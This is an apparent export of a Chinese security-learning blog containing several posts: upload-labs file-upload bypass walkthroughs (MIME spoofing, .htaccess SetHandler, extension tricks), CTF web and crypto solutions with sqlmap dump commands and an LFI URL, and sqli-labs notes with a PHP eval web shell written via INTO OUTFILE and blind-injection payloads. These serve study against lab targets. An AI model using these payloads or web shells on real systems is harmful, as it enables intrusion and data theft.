上传jpg文件时，Content-Type的值是image/jpeg 如果服务器通过Content-Type的值判断文件类型，上传php文件(webshell)时，将Content-Type的值修改为image/jpeg，即可上传php文件(webshell)。 所以上传webshell.php，抓包修改Content-Type的值为image/jpegForward发包，上传成功测试连接，连接成功 三、黑名单限制文件上传Apache解析 有些Apache允许解析其他文件后缀。如在http.conf中，若配置有如下代码，则能解析php和phtml文件AddType application/x-httpd-php .php .phtml Apache的解析顺序是从右到左开始解析文件后缀的，如果最右侧扩展名不可识别，就继续往左判断。直到遇到可以解析的文件后缀为止htaccesshtaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。绕过文件后缀的方法 上传一个后缀为phtml的webshell 上传文件名类似1.php.xxxx，因为后缀xxxx不可以解析，所以向左解析后缀.php 构造.htaccess，实现重写文件解析。 大小写绕过 双写绕过 在后缀名中加空绕过 在后缀名中加”.”绕过 等等 Pass-03(上传webshell.phtml绕过) 直接上传webshell，发现上传失败。查看源码 $is_upload = false; $msg = null; if (isset($_POST[&#39;submit&#39;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&#39;.asp&#39;,&#39;.aspx&#39;,&#39;.php&#39;,&#39;.jsp&#39;); $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#39;.&#39;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if(!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $img_path = UPLOAD_PATH.&#39;/&#39;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) { $is_upload = true; } else { $msg = &#39;上传出错！&#39;; } } else { $msg = &#39;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#39;; } } else { $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;; } } 黑名单判断，不允许上传.asp|.aspx|.php|.jsp后缀文件。尝试第一种方法，上传webshell.phtml上传成功，测试连接，连接失败。。 参考大佬博客，发现没有配置添加如下代码： AddType application/x-httpd-php .php .phtml 配置方法参照：ubuntu下apache与php配置好了，我已经配置完毕，删除之前的文件，再上传一次。测试连接，连接失败。。emmmmm。。。。查看上传的文件发现文件名被替换了。所以连接时文件名换一下，连接成功 Pass-04(重写文件解析绕过)查看源码 $is_upload = false; $msg = null; if (isset($_POST[&#39;submit&#39;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;); $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#39;.&#39;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $img_path = UPLOAD_PATH.&#39;/&#39;.$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = &#39;上传出错！&#39;; } } else { $msg = &#39;此文件不允许上传!&#39;; } } else { $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;; } } 黑名单判断，不允许上传后缀文件为 .php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf这样Pass-03的方法就没办法使用了。所以尝试使用方法3，构造.htaccess，实现重写文件解析。同样这样的前提也是得在配置文件里面有这样的一句话 AllowOverride All LoadModule rewrite_module modules/mod_rewrite.so 因为我的配置文件没有，所以配置一下。参考博客：apache开启rewrite重写.htaccess攻击配置完毕。把SetHandler application/x-httpd-php 这句话写成.htaccess，然后上传个jpg，它就当php解析了。.htaccess文件内容为： &lt;FilesMatch &quot;webshell&quot;&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt; 先上传.htaccess文件，然后上传webshell.jpg上传成功，测试连接，连接成功 Pass-05(大小写绕过)查看源码发现，与Pass-04相比，多了不允许上传后缀文件.htaccess，但是没有将后缀进行大小写统一，于是可以通过大小写绕过。上传webshell.phP，上传成功。测试连接，连接失败。查看文件，发现文件名被替换重新输入文件名，测试连接，连接成功 Pass-06(加空格绕过)查看源码发现还是黑名单，但是没有对后缀名进行去空处理，可在后缀名中加空绕过。上传webshell.php，抓包，加空格上传成功。查看上传的文件名测试连接，连接成功 Pass-07(加.绕过)还是黑名单，禁止上传所有可以解析的后缀。但是没有对后缀名进行去”.”处理，利用windows特性，会自动去掉后缀名中最后的”.”，可在后缀名中加”.”绕过。上传webshell.php，抓包，加.上传成功。测试连接，连接成功 Pass-08(加::$DATA绕过)还是黑名单，但是没有对后缀名进行去”::$DATA”处理，利用windows特性，可在后缀名中加” ::$DATA”绕过。上传webshell.php，抓包，加::$DATA上传成功。测试连接，连接失败。因为我用的ubantu，所以用Windows执行上述操作就ok了，就不叙述了。 Pass-09(点+空格+点绕过)查看源码 $is_upload = false; $msg = null; if (isset($_POST[&#39;submit&#39;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#39;.&#39;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $img_path = UPLOAD_PATH.&#39;/&#39;.$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = &#39;上传出错！&#39;; } } else { $msg = &#39;此文件类型不允许上传！&#39;; } } else { $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;; } } 还是黑名单，但是第15行和之前不太一样，路径拼接的是处理后的文件名。str_replace先删除一个点，再删除一个空格。点+空格+点，经过处理后，文件名变成webshell.php.，即可绕过。上传成功。测试连接，连接成功 Pass-10(双写绕过)查看源码发现关键代码 $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);//定义name $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);//替换上面的php这些为空 将问题后缀名替换为空，于是可以利用双写绕过。上传webshell.php，抓包，双写上传成功。测试连接，连接成功好了，就先总结这么多，剩下的另一篇《文件上传漏洞 学习笔记(二)》进行总结。 感悟文件上传漏洞总结之后，对文件上传漏洞理解了很多，也收获了很多。继续努力学习。小白进阶ing","categories":[{"name":"漏洞原理","slug":"漏洞原理","permalink":"https://qwzf.github.io/categories/漏洞原理/"},{"name":"文件上传漏洞","slug":"漏洞原理/文件上传漏洞","permalink":"https://qwzf.github.io/categories/漏洞原理/文件上传漏洞/"}],"tags":[{"name":"JS绕过","slug":"JS绕过","permalink":"https://qwzf.github.io/tags/JS绕过/"},{"name":"MIME绕过","slug":"MIME绕过","permalink":"https://qwzf.github.io/tags/MIME绕过/"},{"name":"黑名单绕过","slug":"黑名单绕过","permalink":"https://qwzf.github.io/tags/黑名单绕过/"}],"author":"qwzf"},{"title":"南邮-Web(一)","slug":"南邮-Web(一)","date":"2019-07-25T12:05:46.537Z","updated":"2019-08-25T11:47:10.635Z","comments":true,"path":"2019/07/25/南邮-Web(一)/","link":"","permalink":"https://qwzf.github.io/2019/07/25/南邮-Web(一)/","excerpt":"","text":"前言最近做了些南邮的Web题，虽然有些比较基础，但依旧可以学到一些Web知识。 正文Web1：签到题题比较基础，查看源码即可 Web2：md5 collision审计题目的代码可知： 字符串QNKCDZO进行md5，得到md5值0e830400451993494058024219903391并赋值给变量$md51。 GET请求获取提交a的值并赋值给变量$a，并对$a进行md5操作赋值给$md52。 若变量$a不为空，且不等于’QNKCDZO’，并$md51与$md52的值内容相等，则可以得到 flag。 由于$md51为0e830400451993494058024219903391，在==比较时，会被认为是0*10^830400451993494058024219903391，也就是0。 那满足条件的变量$a就是其md5值是0e开头的即可找一个md5加密后为0的值：s878926199a更多请点击-&gt;MD5加密后==’0’ 由于是GET请求获取变量$a，构造参数flag显现 Web3：签到2 很明显，口令有11位，输入框只能输10位，增大输入框长度即可。输入口令得到flag Web4：这题不是WEB看题目提示，可能此题不是Web题。。。点开题目地址分析发现就这张图片比较可疑，保存图片，看是不是图片隐写。先用WinHex打开果然这题不是WEB，是图片隐写 Web5：层层递进题目描述没有提示，点击题目地址没有有用信息，查看网页源码发现有个SO.html,输入到url地址栏，并查看源码发现有个S0.html，输入到url地址栏，并查看源码发现有个SO.htm，输入到url地址栏，并查看源码发现有个S0.htm，输入到url地址栏，并查看源码发现有个404.html，输入到url地址栏查看源码发现flag了，flag是nctf{this_is_a_fl4g}。果然是层层递进。。。。。 Web6：AAencode先百度AAencode： 什么是jjencode?将JS代码转换成只有符号的字符串 什么是aaencode？将JS代码转换成常用的网络表情。 根据题目描述，这是一道颜文字js加密，但是密文不应该是这样。所以应该编码有问题。用火狐打开，单击查看–&gt;文字编码–&gt;unicode编码成功，然后进行颜文字解密。可以用火狐的控制台，也可以用谷歌的Console Web7：单身二十年打开题目，查看源码点击，发现并没有进入到search_key.php。应该是重定向了。所以抓包，发送到Repeater点击Go，发包，得到flag了 Web8：php decode审计php代码。发现eval函数1，先百度一下eval：eval() 函数用来执行一个字符串表达式，并返回表达式的值。eval()函数会执行括号里面的语句，这种代码在现实中一般是某个黑客上传的一句话马。但在这里eval里面肯定就是flag了，所以将eval改为echo输出eval里面的内容运行php代码，得到flag Web9：文件包含点击”click me? no”，发现存在文件包含 http://4.chinalover.sinaapp.com/web7/index.php?file=show.php 文件包含？！不会。。。了解一下吧！文件包含漏洞文件包含解释：LFI是能够打开并包含本地文件的漏洞 所以这道题是本地文件包含， 尝试使用伪协议读取php文件 http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/read=convert.base64-encode/resource=index.php 得到base64加密后的字符串Base64解密，看到原内容，得到flag。 Web10：单身一百年也没用这道题Web7单身二十年很像，但当我们直接点击“到这里找KEY”然后再进行抓包时，找不到异常。额。不会了。。查看一下大佬的博客，了解到当我们先抓包再点击接着再抓包时候会找到302重定向错误代码，这时候可以在响应头中找到flag。大佬用的是火狐，而我的火狐有点问题，没有抓到中间重定向的包。所以我直接用的谷歌的Network百度302错误代码：302重定向又称之为302代表暂时性转移(Temporarily Moved )，英文名称：302 redirect。 也被认为是暂时重定向temporary redirect），一条对网站浏览器的指令来显示浏览器被要求显示的不同的URL，当一个网页经历过短期的URL的变化时使用。一个暂时重定向是一种服务器端的重定向，能够被搜索引擎蜘蛛正确地处理。 Web：Download~!题崩了，打不开了。。。。 Web11：COOKIE有一个提示0==not点开题目“please login first!”翻译成“请先登录！”，burpsuite抓包发现Cookie：Login=0，而0===not，所以将0改为1，再点击Forword发包，得到flag Web12：MYSQL题目没有提示，点开题目robots.txt这个我知道,之前做攻防世界的Web题遇到过robots协议robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。所以在url栏里输入robots.txt发现提示sql.php，在另一窗口打开。然后审计php代码，发现intval() 函数，百度一下intval() 函数intval() 函数用于获取变量的整数值。intval() 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。 理解一下php代码1、$id等于$_GET[id]的整数值2、sql查询语句id=&#39;$id&#39;3、如果 $_GET[id]==1024返回“no! try again”，否则返回数据库content字段内容所以在sql.php页面进行get传参。get传递的参数不能等于1024，且查询时id=1024，所以get传一个整数部分为1024的浮点数即可。最终得到flag。 Web13：GBK Injection这道题是宽字节注入，我还没学到，就先用sqlmap做一下吧，正好可以熟悉熟悉sqlmap命令的使用至于为什么要加%df%df%27是双字节不转义单引号实现注入的方法，具体看大佬博客gbk字符编码和宽字节sql注入1、爆库命令： sqlmap.py -u &quot;http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df%27&quot; --current-db 所以当前数据库为：sae-chinaover2、爆表命令： sqlmap.py -u &quot;http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df%27&quot; --tables -D sae-chinalover 3、爆字段和数据发现6个表，根据题目标题GBK Injection，所以flag有可能在gbksqli表里命令： sqlmap.py -u &quot;http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df%27&quot; --dump -T gbksqli -D sae-chinalover 当然，如果没想到这个表，可以一个表一个表的试。需要注意的是，在ctf4表里也出现了flag但这个并不是这道题的答案。 Web14：变量覆盖似乎没听说过，那先了解一下有关变量覆盖的基础知识吧变量覆盖漏洞详解CTF之php变量覆盖漏洞开始做题点开显眼的source.php文件审计php代码，发现如果$pass==$thepassword_123就显示flag。所以构造get传参值，让两变量相等得到flag。就先总结这么多吧。。。。。。。。。。。。 感悟题不是太难，重点是基础知识的掌握。尤其是文件包含的理解和代码审计的能力。小白进阶ing。。。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.github.io/tags/CTF/"},{"name":"Web","slug":"Web","permalink":"https://qwzf.github.io/tags/Web/"},{"name":"南邮","slug":"南邮","permalink":"https://qwzf.github.io/tags/南邮/"}],"author":"qwzf"},{"title":"Crypto-简单加密","slug":"Crypto-简单加密","date":"2019-07-21T13:30:41.000Z","updated":"2019-08-06T15:21:20.446Z","comments":true,"path":"2019/07/21/Crypto-简单加密/","link":"","permalink":"https://qwzf.github.io/2019/07/21/Crypto-简单加密/","excerpt":"","text":"前言由于上次总结了位移编码，于是又补了一篇简单加密。 围在栅栏中的爱首先看到密文，这是摩斯电码可以直接在线摩斯电码解密：得到英文字母KIQLWTFCQGNSOO发现并没有什么规律，根据题目“围在栅栏中的爱”，进行栅栏解密也得不到有用信息。看到题目描述“最近一直在好奇一个问题，QWE到底等不等于ABC？”QWE？！很明显这是键盘密码的键盘替换密码，也就是键盘QWE加密法了解一下相关知识： 电脑键盘加密包围圈加密如：k我们可以加密为ijmll可以加密为pkm竖对称加密如：l对称ao对称wv对称v(中心点不加密)e对称iqwe v码如：a=qw s=we q=12 z=as夹位法如：a=qz w=sx k=i p=p凯撒移位明文:help密文:jrza猪圈带入如：d=qwed键盘手势看手运动的轨迹如：ytfvbhn手势是aQWE替换加密如：QWERT对应ABCDE当然还有很多，可以了解一下 开始做题因为这道题涉及了QWE替换加密，所以配一张图可以一个一个进行对照，当然这也有个大佬的脚本 def search(x): return{&#39;q&#39;:&#39;a&#39;,&#39;w&#39;:&#39;b&#39;,&#39;e&#39;:&#39;c&#39;,&#39;r&#39;:&#39;d&#39;,&#39;t&#39;:&#39;e&#39;,&#39;y&#39;:&#39;f&#39;,&#39;u&#39;:&#39;g&#39;,&#39;i&#39;:&#39;h&#39;,&#39;o&#39;:&#39;i&#39;,&#39;p&#39;:&#39;j&#39;,&#39;a&#39;:&#39;k&#39;, &#39;s&#39;:&#39;l&#39;,&#39;d&#39;:&#39;m&#39;,&#39;f&#39;:&#39;n&#39;,&#39;g&#39;:&#39;o&#39;,&#39;h&#39;:&#39;p&#39;,&#39;j&#39;:&#39;q&#39;,&#39;k&#39;:&#39;r&#39;, &#39;l&#39;:&#39;s&#39;,&#39;z&#39;:&#39;t&#39;,&#39;x&#39;:&#39;u&#39;,&#39;c&#39;:&#39;v&#39;,&#39;v&#39;:&#39;w&#39;,&#39;b&#39;:&#39;x&#39;,&#39;n&#39;:&#39;y&#39;,&#39;m&#39;:&#39;z&#39;, }.get(x,x) def main(): print(&quot;QWE键盘解密程序&quot;) print(&quot;请输入待解密的字符串：&quot;) while True: try: miwen=input() miwen=miwen.lower() print(&quot;结果是：&quot;) for i in miwen: print(search(i),end=&#39;&#39;) print(&quot;\\n&quot;) except: break if __name__==&quot;__main__&quot;: main() 密文为：KIQLWTFCQGNSOO解密后：RHASBENVAOYLII然后再根据题目标题，想到栅栏解密，结果有两种：第1种：RABNAYIHSEVOLI第2种：RVHAAOSYBLEINI很显然是第一种结果的倒序，反转以后结果如下：ILOVESHIYANBAR试了之后发现最后结果要小写，有点坑。。。 小心猪圈很明显是Base64加密的，所以了解一下Base64、Base32和Base16： Base64、Base32、Base16范围Base64范围：A-Z、a-z、0-9、+/Base32范围：A-Z、2-7Base16范围：0-9、A-F当ASCll用Base加密达不到所对应的位数的时候用=号补齐编码方式ASCII 是用128（2的8次方）个字符，对二进制数据进行编码的方式base64编码是用64（2的6次方）个字符，对二进制数据进行编码的方式base32就是用32（2的5次方）个字符，对二进制数据进行编码的方式base16就是用16（2的4次方）个字符，对二进制数据进行编码的方式Base64Base64加密方式是将三个八位的字节转化为四个六位的字节（不足八位的高位补00），38 = 46；，所以base64加密过后的内容比原来的大三分之一；如：加密“ace”ace转化为二进制为：‭01100001‬ ‭01100011‬ ‭01100101‬转化为base64的四字节六位：011000 01‬‭0110 0011‬01 100101‬那因为计算机是一字节八位的存数，所以高位补00后变为：00011000 0001‬‭0110 000011‬01 00100101‬转化为十进制：24 22 13 37Base32 Base32将任意字符串按照字节进行切分，并将每个字节对应的二进制值（不足8比特高位补0）串联起来，按照5比特一组进行切分，并将每组二进制值转换成十进制来对应32个可打印字符中的一个。Base16Base16编码使用16个ASCII可打印字符（数字0-9和字母A-F）对任意字节数据进行编码。Base16先获取输入字符串每个字节的二进制值（不足8比特在高位补0），然后将其串联进来，再按照4比特一组进行切分，将每组二进制数分别转换成十进制，在下述表格中找到对应的编码串接起来就是Base16编码。可以看到8比特数据按照4比特切分刚好是两组，所以Base16不可能用到填充符号“=”。了解结束开始做题，首先将题目字符串进行Base64解密发现16进制数值，然后Base16解密发现数字最大小于7，所以Base32解密然后又发现是Base64，所以Base64解密发现flag那种样式了，然后根据题目“小心猪圈”，应该就是猪圈密码解密了，先了解一下猪圈密码： 猪圈密码猪圈密码还有一个名字叫共济会密码，属于最古老的密码之一，也是密码学里最简单易懂的密码。它是以格子为基准的简单代替式逻辑密码，无论怎么变化都可以找到逻辑替代的方法，曾经是美国内战时盟军使用的密码。对应下图就是：HORSE下面给了个猪圈密码的对照表所以对密文：ocjp{zkirjwmo-ollj-nmlw-joxi-tmolnrnotvms}进行猪圈对照，ocjp对应flag，依次对照得到flag上边那个QWE键盘加密的脚本改写写一下就可以了 def search(x): return{&#39;j&#39;:&#39;a&#39;,&#39;k&#39;:&#39;b&#39;,&#39;l&#39;:&#39;c&#39;,&#39;m&#39;:&#39;d&#39;,&#39;n&#39;:&#39;e&#39;,&#39;o&#39;:&#39;f&#39;,&#39;p&#39;:&#39;g&#39;,&#39;q&#39;:&#39;h&#39;,&#39;r&#39;:&#39;i&#39;,&#39;w&#39;:&#39;s&#39;,&#39;x&#39;:&#39;t&#39;, &#39;y&#39;:&#39;u&#39;,&#39;z&#39;:&#39;v&#39;,&#39;a&#39;:&#39;j&#39;,&#39;b&#39;:&#39;k&#39;,&#39;c&#39;:&#39;l&#39;,&#39;d&#39;:&#39;m&#39;,&#39;e&#39;:&#39;n&#39;, &#39;f&#39;:&#39;o&#39;,&#39;g&#39;:&#39;p&#39;,&#39;h&#39;:&#39;q&#39;,&#39;i&#39;:&#39;r&#39;,&#39;s&#39;:&#39;w&#39;,&#39;t&#39;:&#39;x&#39;,&#39;u&#39;:&#39;y&#39;,&#39;v&#39;:&#39;z&#39;, }.get(x,x) def main(): print(&quot;解密程序&quot;) print(&quot;请输入待解密的字符串：&quot;) while True: try: miwen=input() miwen=miwen.lower() print(&quot;结果是：&quot;) for i in miwen: print(search(i),end=&#39;&#39;) print(&quot;\\n&quot;) except: break if __name__==&quot;__main__&quot;: main() 混合编码下载题目，并打开发现是Base64，Base64解密得解密结果是Unicode？！了解一下 UnicodeUnicode编码后的大小是一样的.例如一个英文字母 “a” 和 一个汉字 “好”，编码后都是占用的空间大小是一样的，都是两个字节！Unicode可以用来表示所有语言的字符，而且是定长双字节（也有四字节的）编码，包括英文字母在内。 UNICODE字符集有多个编码方式，分别是UTF-8，UTF-16，UTF-32和UTF-7编码。 好了开始做题，unicode解码 然后再Base64解码 很明显结果是10进制，所以10进制转ASCII 得到flag。 疑惑的汉字汉字有关的密码？！我想到了当铺密码，了解一下 当铺密码当铺密码就是一种将中文和数字进行转化的密码，算法相当简单:当前汉字有多少笔画出头，就是转化成数字几。所以转化一下然后10进制转ASCII得到flag 感悟对密码这一块又有了掌握，做题过程中发现好多RSA的题，该总结总结了，继续努力！小白进阶ing。。。。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.github.io/tags/CTF/"},{"name":"Crypto","slug":"Crypto","permalink":"https://qwzf.github.io/tags/Crypto/"},{"name":"简单加密","slug":"简单加密","permalink":"https://qwzf.github.io/tags/简单加密/"}],"author":"qwzf"},{"title":"sqli-labs攻关2(Less-7_Less-10)","slug":"sqli-labs攻关2(Less-7_Less-10)","date":"2019-07-19T14:05:21.000Z","updated":"2020-08-01T16:55:55.983Z","comments":true,"path":"2019/07/19/sqli-labs攻关2(Less-7_Less-10)/","link":"","permalink":"https://qwzf.github.io/2019/07/19/sqli-labs攻关2(Less-7_Less-10)/","excerpt":"","text":"前言之前已经通过sqli-libs攻关的方式，总结过SQL注入的简单注入和双注入。所以这次继续通过sqli-libs攻关的方式总结SQL注入的布尔盲注和时间盲注。 正文在开始盲注前，先把之前未总结的导出文件GET字符型注入学习一下 一、导出文件-GET注入导出文件1、LOAD_FILE可以利用该函数，进写入shell用法：select load_file(‘file1’) into outfile ‘file2’将file1的文件导入WEB目录file2的文件中进行访问。2、payload中只能在/home/wwwroot/default/mysql才能写入或者读取文件。因为mysql目录的权限我们设置chowm -R mysql:mysql3、另外要保证正常的文件写入与读取要在mysql配置文件my.cnf最后一行新增secure_file_priv= “/“方法，才能使用LOAD_FILE在生产环境情况下。 利用导出到文件就是可以将查询结果导出到一个文件中，如常见的将一句话木马导出到一个php文件中，sqlmap中也有导出一句话和一个文件上传的页面。常用的语句是： select &quot;&lt;?php @eval($_POST[&#39;giantbranch&#39;]);?&gt;&quot; into outfile &quot;XXX\\test.php&quot; ，当这里要获取到网站的在系统中的具体路径（绝对路径）获取方法，根据系统和数据库猜测。如winserver的asp默认路径是c:/inetpub/wwwroot/linux的nginx一般是/usr/local/nginx/html，/home/wwwroot/default，/usr/share/nginx，/var/www/html等apache/var/www/htm，/var/www/html/htdocs Less-7导出文件GET字符型注入1、利用写入新增任意文件payload ?id=-1&#39;)) union select 1,2,&#39;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#39; into outfile &quot;/home/wwwroot/default/mysql/1.txt&quot; --+ 2、验证是否写入成功payload访问写入的文件mysql/1.txt 二、GET盲注布尔盲注1.布尔盲注利用前提页面没有显示位，没有输出SQL语句执行错误信息，只能通过页面返回正常不正常来判断是否存在注入。2.布尔盲注过程 (select count(schema_name) from information_schema.sc hemata)&gt; n n为数据库个数，当数据库个数大于n页面显示正常 (select length(schema_name) from information_schema.s chemata limit 0,1)&gt; n 该语句判断数据库内第一个数据库名有多少字符，大于n则页面显示正常 (select ascii(substr((select schema_name from informa tion_schema.schemata limit 0,1),1,1)))&gt;105 ascii（）将返回字符串的ascii值。第一个1，表示截取字符串的起始位置。第二个1，表示截取字符串长度语句作用：判断第一个库第一个字符是什么时间盲注1.时间盲注利用前提页面上没有显示位，也没有输出SQL语句执行错误信息。 正 确的SQL语句和错误的SQL语句返回页面都一样，但是加入sleep(5)条 件之后，页面的返回速度明显慢了5秒。2.时间盲注过程 if((select count(schema_name) from information_schema. schemata)=9,sleep(5),1) 判断数据库个数 if((select length(schema_name) from information_schem a.schemata limit 0,1)=18,sleep(5),1) if((select ascii(substr((select schema_name from info rmation_schema.schemata limit 0,1),1,1)))=105,sleep(5),1) 判断 第一个库第一个字符相关函数 Length（）函数 返回字符串的长度 substr（）截取字符串 ascii（）返回字符的ascii码 sleep(n)：将程序挂起一段时间 n为n秒 if(expr1,expr2,expr3):判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句 思路1.先利用length()判断数据库长度2.然后利用if函数、substr函数和ascii函数构造猜测数据库名ascii码的值的语句。 Less-8布尔型单引号GET盲注1、测试1.测闭合方式输入id=1输入id=1&#39;输入id=1’–+正常，输入id=1’ and 1=1–+正常，输入id=1’ and 1=2–+不回显，可判定是字符型注入并且为单引号闭合。2.测列输入id=1&#39; order by 4--+不回显，说明有三列。3.测长度判断数据库名的长度输入id=1&#39; and (length(database())=8)--+正常说明长度为8。4.测字符用substr()截取字符串的每个字符，ascii()将字符串转换成其ASCII码输入id=1&#39; and (ascii(substr(database(),1,1))&gt;97)--+正常2、注入1.猜库第一个字符 输入?id=1&#39; and (ascii(substr(database(),1,1))&gt;110)--+正常， 输入?id=1&#39; and (ascii(substr(database(),1,1))&gt;116)--+不回显， 输入?id=1&#39; and (ascii(substr(database(),1,1))&gt;113)--+正常， 输入?id=1&#39; and (ascii(substr(database(),1,1))&gt;114)--+正常， 输入?id=1&#39; and (ascii(substr(database(),1,1))&gt;115)--+不回显， 说明数据库名的第一个字符ASCII码为115，即“s”。第二个字符 输入?id=1&#39; and (ascii(substr(database(),2,1))&gt;101)--+不回显， 输入?id=1&#39; and (ascii(substr(database(),2,1))&gt;100)--+正常， 说明第二个字符是“e“。以此类推。脚本 url = &quot;http://localhost/sqlilabs/Less-8/?id=&quot; start_str = &quot;1&#39; and &quot; info_table_name = &quot;schemata&quot; info_column_name = &quot;schema_name&quot; 2.猜表payload ?id=1&#39; and (ascii(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),1,1))&gt;97)--+ 正常 然后改变大于号后面的数字，查找到第一个字符的ASCII码，再改变substr()函数的第二个参数值获取下一个字符，改变limit子句判断下一个表名。脚本 info_table_name = &quot;tables&quot; info_column_name = &quot;table_name&quot; database_name = &quot;security&quot; where_str = &quot; where table_schema=&#39;&quot;+database_name+&quot;&#39;&quot; 3.猜字段payload ?id=1&#39; and ascii(substr((select column_name from information_schema.columns where table_name=&#39;users&#39; and table_schema=&#39;security&#39; limit 0,1),1,1))&gt;97--+ 脚本 info_table_name = &quot;columns&quot; info_column_name = &quot;column_name&quot; table_name = &quot;users&quot; where_str = &quot; where table_schema=&#39;&quot;+database_name+&quot;&#39;&quot;+&quot; and 